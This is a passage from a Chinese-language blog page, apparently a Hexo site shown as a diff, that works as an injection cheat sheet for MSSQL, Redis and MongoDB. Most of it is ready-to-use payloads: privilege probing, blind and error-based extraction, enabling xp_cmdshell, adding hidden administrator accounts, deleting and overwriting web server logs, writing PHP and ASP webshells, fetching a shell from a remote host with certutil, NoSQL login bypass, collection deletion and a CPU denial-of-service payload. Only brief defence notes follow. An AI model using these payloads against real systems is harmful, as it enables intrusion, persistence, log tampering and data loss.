+and 1=(select IS_SRVROLEMEMBER(&#39;securityadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;diskadmin&#39;));--
+and 1=(select IS_SRVROLEMEMBER(&#39;bulkadmin&#39;));--
+and 1=(select IS_MEMBER(&#39;db_owner&#39;));-
+</code></pre>
+<p>如果当前用户是sa，则执行三个都正常显示。如果是db_owner，则执行sa不正常显示，执行public正常显示。如果是public，则只执行public才正常显示</p>
+<h4 id="查看数据库版本"><a href="#查看数据库版本" class="headerlink" title="查看数据库版本"></a>查看数据库版本</h4><pre><code class="javascript">?id=1 and 1=(select @@version)
+</code></pre>
+<h4 id="查看当前数据库名称"><a href="#查看当前数据库名称" class="headerlink" title="查看当前数据库名称"></a>查看当前数据库名称</h4><pre><code class="javascript">?id=1 and 1=(select db_name())
+</code></pre>
+<h4 id="查看第一个用户数据库"><a href="#查看第一个用户数据库" class="headerlink" title="查看第一个用户数据库"></a>查看第一个用户数据库</h4><pre><code class="javascript">?id=1 and 1=(select top 1 name from master..sysdatabases where dbid&gt;4)
+</code></pre>
+<p>dbid&lt;4的数据库是系统自带</p>
+<h4 id="查看所有数据库"><a href="#查看所有数据库" class="headerlink" title="查看所有数据库"></a>查看所有数据库</h4><pre><code class="javascript">?id=1 and 1=(select name from master..sysdatabases for xml path)
+</code></pre>
+<h4 id="获取当前网站使用数据库的表"><a href="#获取当前网站使用数据库的表" class="headerlink" title="获取当前网站使用数据库的表"></a>获取当前网站使用数据库的表</h4><pre><code class="javascript">?id=1 and 1=(select name from sysobjects for xml path)
+</code></pre>
+<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><pre><code class="javascript">?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#39;users&#39;))
+</code></pre>
+<h3 id="盲注-2"><a href="#盲注-2" class="headerlink" title="盲注"></a>盲注</h3><h4 id="布尔盲注-3"><a href="#布尔盲注-3" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><pre><code>and len(db_name(1))&gt;5   //数据库长度
+and ascii(substring(db_name(7),1,1))&gt;100  //爆库名
+and (select count(name) from test..sysobjects where xtype=&#39;U&#39;)&gt;1   //判断表的个数
+and (select count(name) from test..syscolumns where id=(select id from test..sysobjects where name=&#39;users&#39;))=3      //判断字段数
+and len((select top 1 col_name(object_id(&#39;users&#39;),1) from test..sysobjects))&gt;1  //爆字段名
+</code></pre>
+<h4 id="延迟盲注"><a href="#延迟盲注" class="headerlink" title="延迟盲注"></a>延迟盲注</h4><pre><code>判断是否是SA权限
+if(1=(select is_srvrolemember(&#39;sysadmin&#39;))) WAITFOR DELAY &#39;0:0:2&#39;
+判断是否是站库分离(延时后返回正确页面，确定站库没有分离)
+if(host_name()=@@servername) WAITFOR DELAY &#39;0:0:2&#39;
+判断数据库的个数
+IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(LTRIM(STR(COUNT(name))) AS NVARCHAR(4000)),CHAR(32)) FROM master..sysdatabases),1,1))=55) WAITFOR DELAY &#39;0:0:2&#39;
+</code></pre>
+<h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>用到函数convert(int,(select top 1 db_name() ))，</p>
+<p>CAST(USER as int)</p>
+<p>其含义是将第二个参数的值转换成第一个参数的int类型</p>
+<h3 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>SQLServer堆叠注入，由于执行的命令没有回显，所以需要结合时间盲注来查询数据。由于堆叠查询的语句会被执行，所以下面的SQLServer获取权限的奇淫技巧，就是利用到了堆叠注入这一特性。</p>
+<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><h4 id="sa权限下"><a href="#sa权限下" class="headerlink" title="sa权限下"></a>sa权限下</h4><h5 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h5><h6 id="判断是否存在"><a href="#判断是否存在" class="headerlink" title="判断是否存在"></a>判断是否存在</h6><pre><code class="javascript">?id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#39;x&#39; and name = &#39;xp_cmdshell&#39;)
+</code></pre>
+<p><code>xp_cmdshell</code>默认在<code>mssql_2000</code>中是开启的，在<code>mssql_2005</code>之后的版本中则默认禁止。如果用户拥有管理员<code>sa</code>权限则可以用<code>sp_configure</code>重新开启它。</p>
+<h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><pre><code class="javascript">开启 xp_cmdshell：
+exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;,1;reconfigure;
+关闭 xp_cmdshell：
+exec sp_configure &#39;show advanced options&#39;, 1;reconfigure;
+exec sp_configure &#39;xp_cmdshell&#39;, 0;reconfigure
+</code></pre>
+<h5 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h5><h6 id="新建用户"><a href="#新建用户" class="headerlink" title="新建用户"></a>新建用户</h6><pre><code class="javascript">?id=1 ;exec master..xp_cmdshell &quot;net user saul saul123 /add&quot;
+</code></pre>
+<h6 id="添加到管理组"><a href="#添加到管理组" class="headerlink" title="添加到管理组"></a>添加到管理组</h6><pre><code class="javascript">?id=1  ;exec master..xp_cmdshell &quot;net localgroup administrators saul /add&quot;
+</code></pre>
+<h6 id="删除日志记录"><a href="#删除日志记录" class="headerlink" title="# 删除日志记录"></a># 删除日志记录</h6><pre><code>id=1;exec master.dbo.xp_cmdshell &#39;del c:\winnt\system32\logfiles\w3svc5\ex070606.log &gt;c:\temp.txt&#39; 
+</code></pre>
+<h6 id="替换日志记录"><a href="#替换日志记录" class="headerlink" title="替换日志记录"></a>替换日志记录</h6><pre><code> id=1;exec master.dbo.xp_cmdshell &#39;copy c:\winnt\system32\logfiles\w3svc5\ex070404.log c:\winnt\system32\logfiles\w3svc5\ex070606.log &gt;c:\temp.txt&#39; 
+</code></pre>
+<h6 id="写马到网站根目录（已知）"><a href="#写马到网站根目录（已知）" class="headerlink" title="写马到网站根目录（已知）"></a>写马到网站根目录（已知）</h6><pre><code>1;exec master..xp_cmdshell &#39;echo ^&lt;?php @eval($_POST[x]);?^&gt; &gt; C:\phpstudy\www\shell.php&#39;;--
+</code></pre>
+<p>或者远程下载</p>
+<pre><code>1;exec master..xp_cmdshell &#39;certutil -urlcache -split -f http://x.x.x.x/shell.php C:\phpstudy\www\shell2.php&#39;;--
+</code></pre>
+<h4 id="dbowner权限"><a href="#dbowner权限" class="headerlink" title="dbowner权限"></a>dbowner权限</h4><p>搜索web目录</p>
+<pre><code>id=1;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));-- 然后 id=1;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &#39;c:&#39;, 1,1;-- id=1 and(select dir from temp where id=1)&gt;0
+</code></pre>
+<h6 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h6><pre><code>id=1;alter database ssdown5 set RECOVERY FULL;create table test(str image);-- id=1;backup log ssdown5 to disk=&#39;c:\test&#39; with init;-- id=1;insert into test(str) values (&#39;&lt;%execute(request(&quot;cmd&quot;))%&gt;&#39;);-- id=1;backup log ssdown5 to disk=&#39;c:\inetpub\wwwroot\x.asp&#39;;-- id=1;alter database ssdown5 set RECOVERY simple;--
+</code></pre>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><h5 id="xp-cmdshell被禁用"><a href="#xp-cmdshell被禁用" class="headerlink" title="xp_cmdshell被禁用"></a>xp_cmdshell被禁用</h5><h6 id="sp-configure函数"><a href="#sp-configure函数" class="headerlink" title="sp_configure函数"></a>sp_configure函数</h6><p>下面的命令添加一个影子用户并加入管理员组</p>
+<pre><code class="php">declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c net user hack$ 0r@nge /add&#39;;
+declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run
+</code></pre>
+<h5 id="log备份写shell"><a href="#log备份写shell" class="headerlink" title="log备份写shell"></a>log备份写shell</h5><p><strong>前提条件</strong>：</p>
+<p>1.数据库存在注入</p>
+<p>2.用户具有读写权限，一般至少DBO权限</p>
+<p>3.有网站的具体路径</p>
+<p>4.站库不分离</p>
+<p>而且这种方法备份出的马子体积很小，备份成功的可能性很大。</p>
+<p><strong>步骤</strong>：</p>
+<p>1.修改数据库为还原模式(恢复模式)：</p>
+<pre><code class="php">;alter database 库名 set RECOVERY FULL –-
+</code></pre>
+<p>3.建表和字段</p>
+<pre><code class="php">;create table orange(a image)--
+</code></pre>
+<p>3.备份数据库</p>
+<pre><code class="php">;backup log 数据库名 to disk = ‘c:\www\0r@nge1.bak’ with init –
+</code></pre>
+<p>4.往表中写入一句话</p>
+<pre><code class="php">;insert into orange(a) values (0x...)--    //值要进行hex进制转换下
+</code></pre>
+<p>5.利用log备份到web的物理路径</p>
+<pre><code class="php">;backup log 数据库名 to disk = &#39;c:\www\0r@nge2.php&#39; with init-- 
+</code></pre>
+<p>6.删除表</p>
+<pre><code class="php">;Drop table orange-- 
+</code></pre>
+<h5 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h5><p>概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。</p>
+<p>用人话说就是：第二次备份的时候，与上一次完全备份的时候作对比，把不同的内容备份下来，所以只要插入我们的一句话木马，再备份一下，一句话就会被写到数据库中。</p>
+<p><strong>条件</strong>：</p>
+<ol>
+<li>有网站具体路径</li>
+<li>有可写权限(dbo权限以上)</li>
+<li>站库不分离</li>
+</ol>
+<p>1.备份数据库</p>
+<pre><code class="php">;backup database 数据库名 to disk = &#39;C:\www\\...&#39; with init --
+</code></pre>
+<p>2.创建表格</p>
+<pre><code class="php">%&#39;;create table orange(a image) --
+</code></pre>
+<p>3.写入webshell</p>
+<pre><code class="php">%&#39;;insert into orange(a) values (0xxxxx) --
+</code></pre>
+<p>4.进行差异备份</p>
+<pre><code class="php">%&#39;;backup log 数据库名 to disk = &#39;C:\www\orange.asp&#39;  WITH DIFFERENTIAL,FORMAT;--
+</code></pre>
+<p>5.删除表</p>
+<pre><code class="php">;Drop table orange--
+</code></pre>
+<p>这些都是理论，实战中可能被各种过滤，还需要修改payload进行具体绕过</p>
+<h5 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h5><p>特殊字符 %C2%85 или %C2%A0</p>
+<p>科学(0E)和十六进制(0x)表示法</p>
+<p>在From和列名之间使用句号代替空格</p>
+<p>\N分隔符</p>
+<p>一些无法看懂的方法：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86011">https://www.anquanke.com/post/id/86011</a></p>
+<h2 id="Redis利用"><a href="#Redis利用" class="headerlink" title="Redis利用"></a>Redis利用</h2><p> Node.js上最流行的Redis驱动程序为我们提供了一个很好的起点。</p>
+<p>所有函数都采用<code>args</code>数组加上可选的<code>callback</code>函数，或者可变数量的单个参数，后跟可选的回调。</p>
+<p>此功能允许使用多种不同的方式来调用完全相同的功能。 这样的前提条件非常适合注入攻击。 例如，以下两个调用导致完全相同的数据库查询。</p>
+<pre><code>  client.set（“ some_key”，“ some_val”）; 
+ client.set（[[“ some_key”，“ some_val”]）;; 
+</code></pre>
+<p>第一行是我们的注入方法适用的地方。 当攻击者控制任何用逗号分隔的参数时，他可以通过注入数组而不是字符串或整数值来覆盖以下所有参数。 <strong>基本上，我们尝试将第一行（单个参数）转换为第二行（arguments数组）</strong> 。 以下示例在快速应用程序的上下文中说明了这种方法。</p>
+<h3 id="Redis-JSON"><a href="#Redis-JSON" class="headerlink" title="Redis JSON"></a>Redis JSON</h3><p>我们假定一个应用程序从请求中获取一个任意键，并设置一个默认的硬编码值。 在第一个示例中，密钥由<strong>JSON</strong>主体提供。</p>
+<pre><code>app.use（bodyParser.json（））; app.post（&#39;/&#39;，函数（req，res）&#123;
+     redis.set（ req.body.key ，“默认”）;
+ &#125;）; 
+</code></pre>
+<p>普通请求：将JSON主体设置为<code>&#123;key : &quot;foo&quot;&#125;</code>并导致<code>redis.set(&quot;foo&quot;, &quot;default&quot;);</code></p>
+<p>注射要求：将JSON主体设置为<code>&#123;key : [&quot;foo&quot;, &quot;evil&quot;]&#125;</code>并<code>redis.set([&quot;foo&quot;, &quot;evil&quot;], &quot;default&quot;);</code></p>
+<p>该插入的数组将作为数据库驱动程序调用的第一个参数<code>req.body.key</code>插入。 驱动程序将注入的数组解释为参数数组，并将<code>foo=evil</code>存储为键值对。 另一方面，现在尾随的<code>&quot;default&quot;</code>值将被忽略。</p>
+<h3 id="Redis-查询字符串"><a href="#Redis-查询字符串" class="headerlink" title="Redis 查询字符串"></a>Redis 查询字符串</h3><p>我们假定使用相同的应用程序，但是这次密钥是由<strong>表单URL编码的</strong> body参数提供的。</p>
+<pre><code>  app.use（bodyParser.urlencoded（））; app.post（&#39;/&#39;，函数（req，res）&#123;
+     redis.set（ req.body.key ，“默认”）;
+ &#125;）; 
+</code></pre>
+<p>普通请求：设置查询字符串t0 <code>key=foo</code>并导致<code>redis.set(&quot;foo&quot;, &quot;default&quot;);</code></p>
+<p>注入请求：将查询字符串设置为<code>key[]=foo&amp;key[]=evil</code>并导致<code>redis.set([&quot;foo&quot;, &quot;evil&quot;], &quot;default&quot;);</code></p>
+<p>此模块启用扩展的查询字符串语法，该语法允许用户将对象或数组作为参数传递。 最重要的是，像express这样的流行框架默认情况下会启用此模块。 在这些情况下， <code>?key[]=foo&amp;key[]=evil</code>转换为一个数组，该数组又被驱动程序解释为一个参数数组。 结果， <code>foo=evil</code>被存储为键值对，并且尾随的<code>&quot;default&quot;</code>值也被清除。</p>
+<h3 id="Redis-编码的表单网址"><a href="#Redis-编码的表单网址" class="headerlink" title="Redis 编码的表单网址"></a>Redis 编码的表单网址</h3><p>我们假定使用相同的应用程序，但是这次密钥是由<strong>表单URL编码的</strong> body参数提供的。</p>
+<pre><code>  app.use（bodyParser.urlencoded（））; app.post（&#39;/&#39;，函数（req，res）&#123;
+     redis.set（ req.body.key ，“默认”）;
+ &#125;）; 
+</code></pre>
+<p>普通请求：设置查询字符串t0 <code>key=foo</code>并导致<code>redis.set(&quot;foo&quot;, &quot;default&quot;);</code></p>
+<p>注入请求：将查询字符串设置为<code>key[]=foo&amp;key[]=evil</code>并导致<code>redis.set([&quot;foo&quot;, &quot;evil&quot;], &quot;default&quot;);</code></p>
+<p>此注入向量利用了<code>bodyParser</code>的行为，该行为使数组可以通过应用于表单URL编码的请求主体的相同扩展语法（如第二个示例所示）进行注入。</p>
+<h3 id="Redis防范"><a href="#Redis防范" class="headerlink" title="Redis防范"></a>Redis防范</h3><p>为了避免 NoSQL 注入，您必须始终将用户输入视为不受信任。您可以执行以下操作来验证用户输入：</p>
+<p>1.使用 sanitization library 。例如，mongo-sanitize 或 mongoose。<br>2.如果找不到适合您环境的库，请将用户输入转换为所需的类型。例如，将用户名和密码转换为字符串。<br>3.白名单</p>
+<h2 id="MongoDB利用"><a href="#MongoDB利用" class="headerlink" title="MongoDB利用"></a>MongoDB利用</h2><p>有两种 NoSQL 注入分类的方式：</p>
+<p>第一种是按照语言的分类，可以分为：PHP 数组注入，JavaScript 注入和 Mongo Shell 拼接注入等等。</p>
+<p>第二种是按照攻击机制分类，可以分为：重言式注入，联合查询注入，JavaScript 注入、盲注等，这种分类方式很像传统 SQL 注入的分类方式。</p>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><pre><code>创建数据库：use DATABASE_NAME，数据库不存在，则创建数据库，否则切换到指定数据库。
+查看所有数据库： show dbs、db.getCollectionNames()
+版本：db.version()
+删除数据库：db.dropDatabase()
+查看当前数据库：db、db.getName()
+插入：db.COLLECTION_NAME.insert(document)
+查询：db.COLLECTION_NAME.find(query, projection)
+db.collection.find(query, projection) //query 可选，使用查询操作符指定查询条件 //可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略） 举例： //查找username为JrXnm的信息 db.user.find(&#123;&#39;username&#39;:&#39;JrXnm&#39;&#125;)  mongodb条件操作符 
+比较：     
+$gt : &gt;    
+$lt : &lt;    
+$gte: &gt;=    
+$lte: &lt;=   
+$ne : !=、&lt;&gt;    //查找用户名不为admin且password为123456的用户    db.user.find(&#123;&#39;username&#39;: &#123;$ne:&#39;admin&#39;&#125;, &#39;password&#39;: &#39;123456&#39;&#125;)     
+/**    * : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;    * : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;    * : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;    */ 
+条件：    
+$in : in    
+$nin: not in    
+$all: all     
+$or:or    
+$and: and    
+$not: 反匹配(1.3.3及以上版本)    
+$exist:     //如果记录中有包含该属性的全部返回    db.collection.find(&#123;title:&#123;$exists:true&#125;&#125;);      //查找用户名为在这个数组中的用户信息    db.user.find(&#123;&#39;username&#39;: &#123;$in: [&#39;admin&#39;, &#39;JrXnm&#39;]&#125;&#125;) 正则：      模糊查询用正则式：db.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)    正则的另一种写法：db.user.find(&#123;&#39;username&#39;:/jrx/i&#125;)
+limit：db.COLLECTION_NAME.find().limit(NUMBER)
+skip：skip() 方法为跳过指定数量的数据。接受一个数字参数作为跳过的记录条数。db.COLLECTION_NAME.find().limit(NUMBER).skip(NUMBER)
+注释：//
+转为 json：tojson()
+</code></pre>
+<p>所有 <code>db</code>的方法：</p>
+<pre><code>
+db.adminCommand(               db.getName(                    db.printSlaveReplicationInfo(
+db.aggregate(                  db.getPrevError(               db.propertyIsEnumerable
+db.auth(                       db.getProfilingLevel(          db.prototype
+db.changeUserPassword(         db.getProfilingStatus(         db.removeUser(
+db.cloneCollection(            db.getQueryOptions(            db.repairDatabase(
+db.cloneDatabase(              db.getReplicationInfo(         db.resetError(
+db.commandHelp(                db.getRole(                    db.revokePrivilegesFromRole(
+db.constructor                 db.getRoles(                   db.revokeRolesFromRole(
+db.copyDatabase(               db.getSession(                 db.revokeRolesFromUser(
+db.createCollection(           db.getSiblingDB(               db.runCommand(
+db.createRole(                 db.getSisterDB(                db.runCommandWithMetadata(
+db.createUser(                 db.getSlaveOk(                 db.runReadCommand(
+db.createView(                 db.getUser(                    db.serverBits(
+db.currentOP(                  db.getUsers(                   db.serverBuildInfo(
+db.currentOp(                  db.getWriteConcern(            db.serverCmdLineOpts(
+db.dbEval(                     db.grantPrivilegesToRole(      db.serverStatus(
+db.dropAllRoles(               db.grantRolesToRole(           db.setLogLevel(
+db.dropAllUsers(               db.grantRolesToUser(           db.setProfilingLevel(
+db.dropDatabase(               db.group(                      db.setSlaveOk(
+db.dropRole(                   db.groupcmd(                   db.setWriteConcern(
+db.dropUser(                   db.groupeval(                  db.shutdownServer(
+db.eval(                       db.hasOwnProperty              db.stats(
+db.forceError(                 db.help(                       db.system.profile
+db.fsyncLock(                  db.hostInfo(                   db.toLocaleString
+db.fsyncUnlock(                db.isMaster(                   db.toString(
+db.getCollection(              db.killOP(                     db.tojson(
+db.getCollectionInfos(         db.killOp(                     db.unsetWriteConcern(
+db.getCollectionNames(         db.listCommands(               db.updateRole(
+db.getLastError(               db.loadServerScripts(          db.updateUser(
+db.getLastErrorCmd(            db.logout(                     db.users
+db.getLastErrorObj(            db.printCollectionStats(       db.valueOf(
+db.getLogComponents(           db.printReplicationInfo(       db.version(
+db.getMongo(                   db.printShardingStatus(
+</code></pre>
+<h3 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h3><p>源码：</p>
+<pre><code>$data = array(
+    &#39;username&#39; =&gt;  $_REQUEST[&#39;username&#39;],
+    &#39;password&#39; =&gt;  $_REQUEST[&#39;password&#39;]
+); 
+$cursor = $collection-&gt;find($data);
+</code></pre>
+<p>payload：?username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1</p>
+<p>该payload解析后数据库返回username不为1且passwd不为1的数据</p>
+<h3 id="联合查询-3"><a href="#联合查询-3" class="headerlink" title="联合查询"></a>联合查询</h3><p>由于使用json会变得比较麻烦</p>
+<p>源码：</p>
+<pre><code>string query =&quot;&#123; username: &#39;&quot; + $username + &quot;&#39;, password: &#39;&quot; + $password + &quot;&#39; &#125;&quot;
+</code></pre>
+<p>正常输入结果：</p>
+<pre><code>&#123;&#39;username&#39;:&#39;admin&#39;, &#39;password&#39;:&#39;123456&#39;&#125;
+</code></pre>
+<p>payload：</p>
+<pre><code>username=admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;: &#39;a&amp;password=&#39; &#125;], $comment: &#39;123456
+</code></pre>
+<p>注入后执行：</p>
+<pre><code>&#123; username: &#39;admin&#39;, $or: [ &#123;&#125;, &#123;&#39;a&#39;:&#39;a&#39;, password: &#39;&#39; &#125;], $comment: &#39;123456&#39;&#125;
+</code></pre>
+<p>爆数据库版本</p>
+<pre><code>?username=test&#39;&#125;);return &#123;username:tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test
+</code></pre>
+<p>爆所有集合名</p>
+<p>PS:因为db.getCollectionNames()返回的是数组，需要用tojson转换为字符串。并且mongodb函数区分大小写</p>
+<pre><code>?username=test&#39;&#125;);return&#123;username=tojson(db.getCollectionNames()),password:2&#125;;//&amp;password=test
+</code></pre>
+<p>爆test集合的第一条数据</p>
+<pre><code>?username=test&#39;&#125;);return &#123;username:tojson(db.test.find()[0]),password:2&#125;;//&amp;password=test
+</code></pre>
+<h3 id="JavaScript-注入"><a href="#JavaScript-注入" class="headerlink" title="JavaScript 注入"></a>JavaScript 注入</h3><h5 id="where"><a href="#where" class="headerlink" title="$where"></a>$where</h5><p>在 MongoDB 中，<code>$where</code> 操作符可以用来执行 JavaScript 代码，将 JavaScript 表达式的字符串或 JavaScript 函数作为查询语句的一部分。</p>
+<p>在 MongoDB 2.4 之前，通过 <code>$where</code> 操作符使用 <code>map-reduce</code>、<code>group</code> 命令可以访问到 Mongo Shell 中的全局函数和属性，如 <code>db</code>，也就是说可以通过自定义 JavaScript 函数来获取数据库的所有信息</p>
+<pre><code>username=1&amp;password=1&#39;;(function()&#123;return(tojson(db.getCollectionNames()))&#125;)();var a=&#39;1
+</code></pre>
+<p>MongoDB 2.4 之后 <code>db</code> 属性访问不到了，但我们应然可以构造万能密码。</p>
+<pre><code>username=1&amp;password=1&#39;;return true//
+或
+username=1&amp;password=1&#39;;return true;var a=&#39;1
+</code></pre>
+<p>还有一种 DOS 攻击的 payload，可以让服务器 CPU 飙升到 100% 持续 5 秒：</p>
+<pre><code>?username=1&amp;password=1;(function()&#123;var date = new Date(); do&#123;curDate = new Date();&#125;while(curDate-date&lt;5000); return Math.max();&#125;)();
+</code></pre>
+<h5 id="使用-Command-方法造成的注入"><a href="#使用-Command-方法造成的注入" class="headerlink" title="使用 Command 方法造成的注入"></a>使用 Command 方法造成的注入</h5><p>MongoDB Driver 一般都提供直接执行 Shell 命令的方法，这些方式一般是不推荐使用的</p>
+<p>在 MongoDB 的服务器端可以通过 <code>db.eval</code> 方法来执行 JavaScript 脚本，如我们可以定义一个 JavaScript 函数，然后通过 <code>db.eval</code> 在服务器端来运行。</p>
+<p><code>eval</code>使用方式在 Mongo3.0 之后已经被废弃了，而且在官方页面中也没有 Mongo3.0 版本之前的下载链接了</p>
+<pre><code>?username=1&#39;&#125;);db.users.insert(&#123;&quot;username&quot;:&quot;ca01h&quot;,&quot;password&quot;:&quot;1&quot;&#125;);db.users.find(&#123;&#39;username&#39;:&#39;2
+</code></pre>
+<p>删掉 users 集合：</p>
+<pre><code class="javascript">?username=1&#39;&#125;);db.users.drop();db.users.find(&#123;&#39;username&#39;:&#39;2
+</code></pre>
+<h5 id="mapReduce"><a href="#mapReduce" class="headerlink" title="mapReduce"></a>mapReduce</h5><p>MongoDB 中的<code>mapReduce</code>函数有点类似于 MySQL 中的<code>group by</code>操作，下面是一个官方文档的例子，在集合 orders 中查找 status:”A” 的数据，并根据 cust_id 来分组，并计算 amount 的总和</p>
+<h3 id="布尔盲注-4"><a href="#布尔盲注-4" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来进行盲注， <code>$regex</code> 可以达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能。</p>
+<p>已知某一个用户名的前提下判断的密码长度：</p>
+<pre><code>?username[$eq]=ca01h&amp;password[$regex]=.&#123;5&#125;
+</code></pre>
+<p>逐位提取字符：</p>
+<pre><code># url格式
+?username[$eq]=ca01h&amp;password[$regex]=c.&#123;4&#125;
+?username[$eq]=ca01h&amp;password[$regex]=ca.&#123;3&#125;
+?username[$eq]=ca01h&amp;password[$regex]=ca0.&#123;2&#125;
+?username[$eq]=ca01h&amp;password[$regex]=c.*
+?username[$eq]=ca01h&amp;password[$regex]=ca.*
+# json格式
+&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^c&quot; &#125;&#125;
+&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca&quot; &#125;&#125;
+&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;ca01h&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^ca0&quot; &#125;&#125;
+</code></pre>
+<p>闭合方法的盲注</p>
+<pre><code>?username=test&#39;&#125;);if (db.version() &gt; &quot;0&quot;) &#123; sleep(10000); exit; &#125;var b=(&#123;a:&#39;1&amp;password=test
+</code></pre>
+<h3 id="防御-3"><a href="#防御-3" class="headerlink" title="防御"></a>防御</h3><p>为了避免 NoSQL 注入，您必须始终将用户输入视为不受信任。您可以执行以下操作来验证用户输入：</p>
+<p>1.使用 sanitization library 。例如，mongo-sanitize 或 mongoose。<br>2.如果找不到适合您环境的库，请将用户输入转换为所需的类型。例如，将用户名和密码转换为字符串。<br>3.白名单<br>4.在 MongoDB 的情况下，切勿在用户输入中使用 where，mapReduce 或 group 运算符，因为这些运算符使攻击者能够注入 JavaScript，因此比其他运算符更加危险。为了加强安全性，在 mongod.conf 如果可能的话，设置 javascriptEnabled 为 false。<br>此外，请始终使用最小特权模型：以尽可能低的特权运行您的应用程序，以便即使被利用，攻击者也无法访问其他资源。</p>
+
+    </div>
+    
+</div>
+                         
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 20xx - 2022 Hexo
+            <span class="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            @John Doe
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a></div>
+        
+    </div>
+</footer>
+                    </div>
+                </div>
+            </transition>
+            <div id="img_show">
+                <img id="img_content" alt="img_show">
+            </div>
+        </div>
+        <script src="https://cdn.staticfile.org/highlight.js/11.5.1/highlight.min.js"></script>
+        <script src="/js/particlex.js"></script>
+        <script src="/js/showimg.js"></script>
+        
+
+    </body>
+</html>
